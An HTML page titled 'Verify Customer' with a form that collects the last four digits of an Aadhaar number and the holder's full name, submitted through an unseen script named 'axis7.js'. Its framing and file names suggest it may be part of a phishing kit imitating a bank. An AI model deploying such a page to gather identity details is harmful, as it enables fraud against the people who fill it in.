<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Customer</title>
    <style>
        body {
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        img {
            width: 100%;
        }

        form {
            max-width: 400px;
            margin: 20px auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
            background-color: #f9f9f9;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }

        #notification {
            text-align: center;
            font-size: 14px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <img src="photo/12.png" alt="Header Image">
    <h1 id="aw">Verify Customer</h1>
    <div id="notification"></div>
    <form id="customer-form">
        <label id="as" for="aadhaarNumber">Last 4-Digit Aadhaar No</label>
        <input type="number" id="aadhaarNumber" placeholder="Enter last 4-digit Aadhaar No" required><br>
        
        <label for="fullName">Full Name As Per Aadhaar</label>
        <input type="text" id="fullName" placeholder="Enter full name (as per Aadhaar)" required><br>
        
        <button type="submit" id="app_data">Continue</button>
    </form>
    <script type="module" src="java.js/axis7.js"></script>
</body>
</html>
